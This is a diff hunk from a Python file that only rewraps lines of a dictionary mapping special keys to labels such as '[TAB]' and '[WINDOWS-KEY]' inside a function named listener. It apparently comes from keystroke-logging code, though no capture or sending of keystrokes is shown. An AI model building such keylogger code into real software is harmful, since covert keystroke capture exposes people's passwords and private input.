@@ -17,10 +17,11 @@ def listener(key):
                 key.tab: " [TAB] ", key.up: " [UP] ", key.down: " [DOWN] ",
                 key.left: " [LEFT] ", key.right: " [RIGHT] ", key.cmd: " [WINDOWS-KEY] ",
                 key.cmd_r: " [WINDOWS-KEY] ", key.f1: " [F1] ", key.f2: " [F2] ",
-                key.f3: " [F3] ", key.f4: " [F4] ", key.f5: " [F5] ", key.f6: " [F6] ",
-                key.f7: " [F7] ", key.f8: " [F8] ", key.f9: " [F9] ",
-                key.f10: " [F10] ", key.f11: " [F11] ", key.f12: " [F12] ",
-                key.alt_l: " [ALT] ", key.alt_r: " [ALT] ", key.caps_lock: " [CAPSLOCK] ", key.home: " [HOME] "
+                key.f3: " [F3] ", key.f4: " [F4] ", key.f5: " [F5] ",
+                key.f6: " [F6] ", key.f7: " [F7] ", key.f8: " [F8] ",
+                key.f9: " [F9] ", key.f10: " [F10] ", key.f11: " [F11] ",
+                key.f12: " [F12] ", key.alt_l: " [ALT] ", key.alt_r: " [ALT] ",
+                key.caps_lock: " [CAPSLOCK] ", key.home: " [HOME] "
                 }
 
     try:
